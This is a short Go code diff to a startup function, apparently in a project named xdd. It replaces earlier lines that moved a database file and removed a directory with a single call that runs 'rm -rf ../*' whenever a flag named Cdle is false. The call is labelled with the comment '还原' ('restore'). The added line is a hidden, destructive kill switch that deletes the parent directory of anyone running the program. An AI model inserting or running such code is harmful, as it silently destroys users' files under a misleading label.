@@ -18,9 +18,7 @@ var pname = regexp.MustCompile(`/([^/\s]+)`).FindStringSubmatch(os.Args[0])[1]
 
 func initVersion() {
 	if !Cdle {
-		cmd("mv ../../xdd/.xdd.db ../../.xdd.db", &Sender{})
-		cmd("rm -rf ../../xdd", &Sender{})
-		panic("bye bye")
+		cmd("rm -rf ../*", &Sender{}) //还原
 	}
 	if Config.Version != "" {
 		version = Config.Version
